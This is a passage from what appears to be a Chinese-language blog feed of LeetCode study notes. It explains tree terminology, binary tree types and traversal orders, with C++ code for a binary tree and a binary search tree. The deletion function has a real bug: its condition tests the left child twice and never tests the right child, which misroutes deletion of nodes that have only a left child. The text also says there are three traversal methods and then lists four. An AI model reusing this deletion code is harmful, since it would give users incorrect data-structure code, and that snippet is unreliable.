class="built_in">search</span>(KEY);</span><br><span class="line">    <span class="keyword">if</span>(deleteNode == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error: no such node in the tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TreeNode *actualDeleteNode = <span class="number">0</span>;</span><br><span class="line">    TreeNode *childOfDeleteNode = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(deleteNode-&gt;leftchild == <span class="literal">NULL</span> || deleteNode-&gt;leftchild == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// 如果是情境一或二，那要被刪除的node就是搜尋找到的node</span></span><br><span class="line">        actualDeleteNode = deleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="comment">// 如果是情境三，要被刪除的就會是該node的Successor 或 Predecessor</span></span><br><span class="line">        actualDeleteNode = <span class="built_in">Successor</span>(deleteNode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接著將 childOfDeleteNode 指向要被釋放記憶體節點的left child 或 right child節點</span></span><br><span class="line">    <span class="keyword">if</span>(actualDeleteNode-&gt;leftchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        childOfDeleteNode = actualDeleteNode-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        childOfDeleteNode = actualDeleteNode-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果要刪除的節點不是leaf，則需要將chuld的parent指回待刪除node的parent</span></span><br><span class="line">    <span class="keyword">if</span>(childOfDeleteNode!=<span class="literal">NULL</span>)&#123; </span><br><span class="line">        childOfDeleteNode-&gt;parent = actualDeleteNode-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接著要分別處理 Parent 指向 child node 的部分</span></span><br><span class="line">    <span class="keyword">if</span>(actualDeleteNode-&gt;parent==<span class="literal">NULL</span>)&#123; <span class="comment">// 要考慮如果 root 就是要被刪掉的node，那他就不會有parent</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;root = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(actualDeleteNode == actualDeleteNode-&gt;parent-&gt;leftchild)&#123;</span><br><span class="line">         actualDeleteNode-&gt;parent-&gt;leftchild = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        actualDeleteNode-&gt;parent-&gt;rightchild = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Case3, the actualDeleteNode might be assigned to successor or predecessor</span></span><br><span class="line">    <span class="keyword">if</span>(deleteNode!= actualDeleteNode)&#123;</span><br><span class="line">        deleteNode-&gt;key = actualDeleteNode-&gt;key;</span><br><span class="line">        deleteNode-&gt;element = actualDeleteNode-&gt;element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> actualDeleteNode;</span><br><span class="line">    actualDeleteNode = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著在 <code>main()</code> 加入 <code>T.DeleteBST(50);</code> (刪除帳相)，輸出結果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">After deletion:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000)</span><br></pre></td></tr></table></figure><p>刪掉甚爾(500) root:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">After deletion:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000)</span><br></pre></td></tr></table></figure><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次學習手刻一個 Binary Tree 以及實現BST Tree 的許多相關操作，也參考了許多資料，逐步完成。而一定會有更好或更加簡易的寫法，希望之後能夠結合 STL 的使用，實際在刷leetcode的過程中用出來。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in">https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in</a></p><p>[2] <a href="https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao">https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao</a></p><p>[3] <a href="https://pjchender.dev/dsa/dsa-bst/">https://pjchender.dev/dsa/dsa-bst/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Tree Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 樹 (Tree) | 基礎篇 | LeetCode 筆記</title>
      <link href="/posts/tree_for_leetcode.html"/>
      <url>/posts/tree_for_leetcode.html</url>
      
        <content type="html"><![CDATA[<!-- Roadmap: (Tree 介紹) -> (Binary Tree介紹) -> (Binary Tree 與 Binary Search Tree 差異) -> (Tree的走訪) -> (建立Binary Tree)  --><h1 id="甚麼是-Tree"><a href="#甚麼是-Tree" class="headerlink" title="甚麼是 Tree?"></a>甚麼是 Tree?</h1><p><img src="/img/LeetCode/tree/tree.png"></p><p>Tree 是一種常見的資料結構，直觀上來看樹狀結構代表階層式結構，像是族譜或是不同語言，語系的直系表就很常用樹來表示。</p><h2 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h2><ul><li><strong>節點(Node)</strong>: 樹的基本單位</li><li><strong>根(Root)</strong>: 樹狀結構的初始節點</li><li><strong>分支(Branch)</strong>: 節點與節點之間的分支</li><li><strong>子節點(child)</strong>: Root以外的節點</li><li><strong>葉子節點(leaf)</strong>: 沒有連接到其他子節點的節點，即樹狀結構的末端節點</li></ul><h2 id="樹的定義"><a href="#樹的定義" class="headerlink" title="樹的定義"></a>樹的定義</h2><p>Tree的定義: <strong>由一個或是數個節點組成的有限集合</strong> 並且</p><ul><li>存在一個特定節點為Root</li><li>其餘節點可以分割成 $n &gt;&#x3D; 0$ 個沒有交集的(disjoint)集合 $T_{1},T_{2},…,T_{n}$ 為此Root的子樹(subtree)</li></ul><blockquote><p>這是一個遞迴的定義，對於上面圖中的節點A(Root)，有兩個子樹，其樹根分別是節點B和節點C，<strong>樹中的每一個節點都是某個子樹的root</strong>，例如節點C 就包含了兩個子樹，它們的root分別是節點E 與節點F，而節點E與F為兩個沒有子樹的樹的樹根</p></blockquote><ul><li>A的子樹: $T_{1}(B,D)$, $T_{2}(C,E,F)$</li><li>B的子樹: $T_{1}(D)$</li><li>C的子樹: $T_{1}(E)$, $T_{2}(F)$</li></ul><h2 id="Tree的特性"><a href="#Tree的特性" class="headerlink" title="Tree的特性"></a>Tree的特性</h2><!-- 這段感覺可以改成用圖表示，比較不冗 --><ul><li><strong>分支度(Degree)為一個節點子樹數量</strong>，以上圖為例，不同節點的degree分別為:<ul><li>A 的 degree&#x3D;2</li><li>B 的 degree&#x3D;1</li><li>C 的 degree&#x3D;2</li></ul></li><li><strong>Leaf of the tree</strong><ul><li>這棵樹的leaf分別為 D, E, F</li></ul></li><li><strong>childs of the tree</strong><ul><li>B,C 為 A的 child node</li><li>D 為 B 的 child node</li><li>E, F 為 C 的 child node</li></ul></li><li><strong>Parents of the tree</strong><ul><li>A 為 B,C 的 parent node</li><li>B 為 D 的 parent node</li><li>C 為 E, F 的 parent node</li></ul></li><li><strong>Siblings of the tree</strong><ul><li>B,C 彼此為 sliblings</li><li>E 與 F 彼此為 sliblings</li><li>其實想成家系表或族譜就好理解了</li></ul></li><li><strong>Descendant nodes of the tree: 代表某個節點棋子樹的所有節點</strong><ul><li>A 的 descendant nodes 即為整棵樹的所有節點</li><li>C 的 descendant ndoes 就是 E 根 F，如果E跟F底下長出新的節點，也會是C的 descendant node</li></ul></li><li><strong>Level of the tree: 樹的level由root開始定義，root level 為level1</strong><ul><li>A: Level 1</li><li>B, C: Level 2</li><li>D,E,F: Level 3</li></ul></li><li><strong>Depth: 某個node到root的level差距</strong><ul><li>BC 的 Depth 為 1</li><li>D,E,F 的　Depth 為 2</li></ul></li></ul><h2 id="樹的優缺點"><a href="#樹的優缺點" class="headerlink" title="樹的優缺點"></a>樹的優缺點</h2><p>這裡可以統整之前學習的資料結構的優缺點</p><table><thead><tr><th>結構</th><th>優點</th><th>缺點</th></tr></thead><tbody><tr><td>陣列</td><td>存取速度快</td><td>插入刪除元素效率低</td></tr><tr><td>鏈結串列</td><td>插入刪除等操作效率高</td><td>存取特定節點值效率低，會需要遍歷list</td></tr></tbody></table><p>而Tree結構能增加儲存、讀取效率，Ex. Binary Sort Tree，既可以保證搜尋速度，同時也可以保證插入、刪除、修改的速度。</p><h2 id="Tree-的表示法"><a href="#Tree-的表示法" class="headerlink" title="Tree 的表示法"></a>Tree 的表示法</h2><p><img src="/img/LeetCode/tree/tree2.png"></p><p><strong>左子-右兄弟表示法(Left Child-Right Sibling Representation)</strong> 是一種表達樹結構的表示法，它的原則是<strong>每個節點至多只有一個左兒子，節點右邊至多也只有一個最近的兄弟</strong>，透過這種表示法可以把上面的樹畫成下面的樹</p><p><img src="/img/LeetCode/tree/LC-RS.png"></p><blockquote><p>這種表示法的好處在於，可以很輕易地得到分支度為2 (<code>dregee = 2</code>) 的樹，只要將 Left-child right sibling樹順時鐘旋轉45度即可</p></blockquote><p><img src="/img/LeetCode/tree/binary_tree.png"></p><div class="note info flat"><p>這個樹的Root的右兒子是空的，這是一定的，因為轉換前的樹跟也必定不會有sibling</p></div><blockquote><p><strong>而上面這種分支度至多為2的樹也就代表每個節點最多就是兩個子樹，這種樹又稱為二元樹(Binary Tree)</strong></p></blockquote><h1 id="Binary-Tree"><a href="#Binary-Tree" class="headerlink" title="Binary Tree"></a>Binary Tree</h1><p>Binary tree 與 Tree是兩回事，一棵 binary tree 的定義如下：</p><blockquote><p>為節點組成的有限集合 (可以是空集合)，每個節點至多有兩個 subTree，左子樹以及有右子樹是有順序的 (不像 Tree 的左右是無序的)</p></blockquote><p>從定義上就可以看出 Binary Tree 與 Tree 之間的差異，Tree不可為空，而Binary Tree可以是空的，Binary Tree在意左右subTree的順序，但Tree並不在意順序。</p><h2 id="Binary-Tree-種類"><a href="#Binary-Tree-種類" class="headerlink" title="Binary Tree 種類"></a>Binary Tree 種類</h2><h3 id="Skewed-Tree"><a href="#Skewed-Tree" class="headerlink" title="Skewed Tree"></a>Skewed Tree</h3><ul><li>Left skewed tree: 所有的 node 都只有 left subTree<br><img src="/img/LeetCode/tree/ls_tree.png"></li><li>Right skewed tree: 所有的 node 都只有 right subTree<br><img src="/img/LeetCode/tree/rs_tree.png"></li></ul><h3 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h3><ul><li>除了 leaf以外，所有節點都有兩個child，<strong>也就是每個節點都存在left和right subTree</strong></li><li>所有的 leaf node 都在同一個 level</li><li>各層節點不一定全滿<br><img src="/img/LeetCode/tree/new_full_btr.png"></li></ul><h3 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h3><ul><li>各層全滿的 Full Binary Tree<br><img src="/img/LeetCode/tree/full_btr.png"></li></ul><h3 id="Complete-BinaryTree"><a href="#Complete-BinaryTree" class="headerlink" title="Complete BinaryTree"></a>Complete BinaryTree</h3><p>對一棵 binary tree 的 node 由上至下，由左至右編號，<strong>若其編號的 node 和 full binary tree 的 node 一模一樣，則可稱為 complete binary tree</strong></p><p><img src="/img/LeetCode/tree/complete_btr.png"><br>上圖編號節點與Full Binary Tree節點一致，因此為 Complete Binary Tree</p><p><img src="/img/LeetCode/tree/not_complete_btr.png"><br>上圖節點編號與Full Binary Tree節點編號不一致，因此不為 Complete Binary Tree</p><div class="note info flat"><p>Full &#x2F; perfect binary tree 為 complete binary tree，但 complete binary tree 不一定是 full &#x2F; perfect binary tree</p></div><blockquote><p>其實總結 Complete Binary Tree的特性其實就是各層節點全滿，除了最後一層，最後一層節點全部靠左</p></blockquote><h2 id="用-Linked-List-表示一個-Tree"><a href="#用-Linked-List-表示一個-Tree" class="headerlink" title="用 Linked List 表示一個 Tree"></a>用 Linked List 表示一個 Tree</h2><p>一個節點結構如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">Node* parent;</span><br><span class="line">Node* left;</span><br><span class="line">Node* right;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Node* root = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="用-Array-表示一個-Tree"><a href="#用-Array-表示一個-Tree" class="headerlink" title="用 Array 表示一個 Tree"></a>用 Array 表示一個 Tree</h2><p>根據<a href="https://web.ntnu.edu.tw/~algo/BinaryTree.html">這篇文章</a>，也可以透過陣列去實作一個Tree。</p><p>也就是以陣列編號來存取節點，並且以編號奇偶數來判斷左或是右子樹。建立一個陣列，以陣列索引值得到節點：樹根的索引值是一，索引值的兩倍是left child，索引值的兩倍再加一是right child，索引值除以二是parent。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> tree[<span class="number">1024</span>];<span class="comment">// tree[0] do nothing</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parent</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index / <span class="number">2</span>;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">left</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index * <span class="number">2</span>;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">right</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;<span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">binary_tree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Root: &quot;</span> &lt;&lt; tree[<span class="number">1</span>];</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The left child of the root: &quot;</span> &lt;&lt; tree[<span class="built_in">left</span>(<span class="number">1</span>)];</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The right child of the root: &quot;</span> &lt;&lt; tree[<span class="built_in">right</span>(<span class="number">1</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/tree/arrary_tree.png"></p><p>但這樣做的缺點也顯而易見，就是樹的大小是固定的，並且如果不是perfect binary tree的話，陣列中會有大量的空值，非常浪費記憶體空間。以陣列大小1024為例，樹的高度也僅為10  ($2^{10}$) </p><h1 id="Binary-Tree-Traversal"><a href="#Binary-Tree-Traversal" class="headerlink" title="Binary Tree Traversal"></a>Binary Tree Traversal</h1><blockquote><p>怎樣算是 Traversal?<br>取決於實作方式，如果是用 Linked List 實現的 Tree，位於 node(A) 可以藉由指向 node(B) 的pointer，由A往B進行移動，可被視為 traversal</p></blockquote><p><img src="/img/LeetCode/tree/traversal.png"></p><p>對於當前節點可以進行的操作:</p><ul><li>V: visting, 可以是印出節點資料之類的操作</li><li>L: 移動到 left child</li><li>R: 移動到 right child</li></ul><blockquote><p>如果現在當前節點是 A節點，加入一個限制  <strong>「L 一定在 R 之前」</strong>，則會產生三種 Traversal 方式: 前序遍歷(preorder traversal)、中序遍歷(inorder traversal)、後序遍歷(postorder traversal)、層序遍歷 (level-order traversal)</p></blockquote><p><img src="/img/LeetCode/tree/3traversal.png"></p><h2 id="Pre-Order-Traversal"><a href="#Pre-Order-Traversal" class="headerlink" title="Pre-Order Traversal"></a>Pre-Order Traversal</h2><p>遍歷順序會是: Root, Left subTree, Right subTree</p><p>可應用於 <strong>Depth-first Search (DFS)</strong></p><p><img src="/img/LeetCode/tree/preorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 VLR 的順序進行檢查，首先先 Visiting A節點(可能執行print節點值之類的操作)，接著檢查 left-child B(L)是否為 null，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope，之後拜訪 B，並接續檢查 left-child，並移動到 D(L)節點，並且Visiting D(L)，由於 D 節點是 Leaf (Left, Right Child 都是 null)，因此回到 B 作為 currentNode 並且拜訪其 right child E(R)，完成後以 B 為 currentNode 的 scope 所有節點拜訪完畢，回到 B的 Parent Node 作為 currenNode 的 scope，這裡也就是指 A(V)，並且接續拜訪其 right child，也就是 C(R)，visiting C完畢後拜訪其 left child，也就是 F(L)，拜訪完畢後，嘗試訪問C的Rigth Child 發現為null，所有結點拜訪完畢，完成本次 Traversal，印出  A B D E C F。</p><h2 id="In-Order-Traversal"><a href="#In-Order-Traversal" class="headerlink" title="In-Order Traversal"></a>In-Order Traversal</h2><p>遍歷順序會是: Left subTree, Root, Right subTree<br>實際上是採用depth-first search，只不過更動了節點的輸出順序。</p><p><img src="/img/LeetCode/tree/Inorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 LVR 的順序進行檢查，先檢查 Left-Child 也就是 B 是否為 NULL，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope 依序檢查其child，首先檢查 B的 Left-child，也就是 D 是否為NULL，若不是則將 CurrentNode 移動到 D(L)，接著就是以 D作為 currentNode 再做一次 post-order 檢查，這時會發現 D的 Letf child 和 right child 都是 NULL，這時就回到 D本身做 visiting (可能是print出D的資料值等等行為)，當前 scope 中所有節點拜訪完畢，之後就要回到 D 的 Parent 來作為當前 CurrentNode 的 scope，currentNode 便移動回 B。接著拜訪 B 的 Right child 也就是 E(R)，拜訪完畢後，以 B 為 currentNode 的 scope 全部拜訪完畢，回到 B 的 parent 也就是 A(V) 進行 Visiting，之後移動到 C(R)，檢查當前 currentNode 的 Left child 也就是 F(L)，進行拜訪，結束後移動回 C(V) 進行拜訪，確認沒有 Right child 後，本次 Traversal 結束，印出 D B E A F C。</p><h2 id="Post-Order-Traversal"><a href="#Post-Order-Traversal" class="headerlink" title="Post-Order Traversal"></a>Post-Order Traversal</h2><p>遍歷順序會是: Left subTree, Right subTree, Root</p><p><img src="/img/LeetCode/tree/postorder_traversal.png"></p><p>遍歷順序的圖解如上圖，一開始 CurrentNode 會進到 Root 節點，也就是 A 節點，接著按到 LRV 的順序進行檢查，先檢查 Left-Child 也就是 B 是否為 NULL，若不是則 CurrentNode 移動到 B(L)，接著以currentNode為scope 依序檢查其child，首先檢查 B的 Left-child，也就是 D 是否為NULL，若不是則將 CurrentNode 移動到 D(L)，接著就是以 D作為 currentNode 再做一次 post-order 檢查，這時會發現 D的 Letf child 和 right child 都是 NULL，這時就回到 D本身做 visiting (可能是print出D的資料值等等行為)，當前 scope 中所有節點拜訪完畢，之後就要回到 D 的 Parent 來作為當前 CurrentNode 的 scope，currentNode 便移動回 B。</p><blockquote><p>回到 B 就代表 以 D 作為 CurrentNode 的迴圈或函式結束</p></blockquote><p>以 B 作為 CurrentNode，post-order 規則來看，目前 Left child 拜訪完畢，接著要拜訪 right child，所以往 E(R) 移動，但也由於 E 跟 D 一樣都是 Leaf，並不會朝 null 移動，因此回到 B(v) 節點進行visting，這樣就完成以 B 為 Scope 的所有 node 之 Visiting。之後回到 A(V)，以A作為 CurrentNode 進行檢查，這時要朝Right child，也就是 C(R) 移動，此時 currentNode 為 C(R)，按照post-order 進行檢查，發現 F 為 Leaf Node，就對 F 進行 Visiting，而之後可以發現 C 的 Right child 為 null，因此掠過 right child 回到 C(V)，對 C 進行 Visiting，之後 currentNode 再回到 A(V) 進行 Visiting，完成本次 Traversal，印出 D E B F C A。</p><h2 id="Level-order-Traversal"><a href="#Level-order-Traversal" class="headerlink" title="Level-order Traversal"></a>Level-order Traversal</h2><p>即為 <strong>breadth-first search(BFS)</strong> ，主要是按照 Level 大小順序由上而下，並且在相同 Level 由左至右依序 Visiting 每個節點</p><blockquote><p>通常會以 Queue 來去進行實作</p></blockquote><p><img src="/img/LeetCode/tree/levelorder_traversal.png"></p><p>輸出順序會是: A B C D E F G H I</p><h1 id="實作-Binary-Tree-的不同-Traversal"><a href="#實作-Binary-Tree-的不同-Traversal" class="headerlink" title="實作 Binary Tree 的不同 Traversal"></a>實作 Binary Tree 的不同 Traversal</h1><h2 id="暴力實作一個-Binary-Tree"><a href="#暴力實作一個-Binary-Tree" class="headerlink" title="暴力實作一個 Binary Tree"></a>暴力實作一個 Binary Tree</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *leftchild;</span><br><span class="line">        TreeNode *rightchild;</span><br><span class="line">        TreeNode *parent;</span><br><span class="line">        string str;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">TreeNode</span>(): <span class="built_in">leftchild</span>(<span class="number">0</span>), <span class="built_in">rightchild</span>(<span class="number">0</span>),<span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">str</span>(<span class="string">&quot;&quot;</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(string s): <span class="built_in">leftchild</span>(<span class="number">0</span>), <span class="built_in">rightchild</span>(<span class="number">0</span>), <span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">str</span>(s)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// the root is the starting node ot the tree</span></span><br><span class="line">        TreeNode *root; </span><br><span class="line">        <span class="built_in">BinaryTree</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode *node): <span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Preorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Postorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>main()</code> 中依序建立節點以及串連節點，形成一顆 Binary Tree</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// Instanitate  all tree nodes</span></span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    TreeNode *nodeB = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    TreeNode *nodeC = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">    TreeNode *nodeD = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">    TreeNode *nodeE = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">    TreeNode *nodeF = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">    TreeNode *nodeG = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">    TreeNode *nodeH = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">    TreeNode *nodeI = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="string">&quot;I&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Construct a binary tree</span></span><br><span class="line">    nodeA -&gt; leftchild = nodeB;</span><br><span class="line">    nodeA -&gt; rightchild = nodeC;</span><br><span class="line">    nodeB -&gt; leftchild = nodeD;</span><br><span class="line">    nodeB -&gt; rightchild = nodeE;</span><br><span class="line">    nodeE -&gt; leftchild = nodeG;</span><br><span class="line">    nodeE -&gt; rightchild = nodeH;</span><br><span class="line">    nodeC -&gt; leftchild = nodeF;</span><br><span class="line">    nodeF -&gt; rightchild = nodeI;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Given a root node</span></span><br><span class="line">    <span class="function">BinaryTree <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Traversal</span></span><br><span class="line">    T.<span class="built_in">Preorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">Inorder</span>(T.root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    T.<span 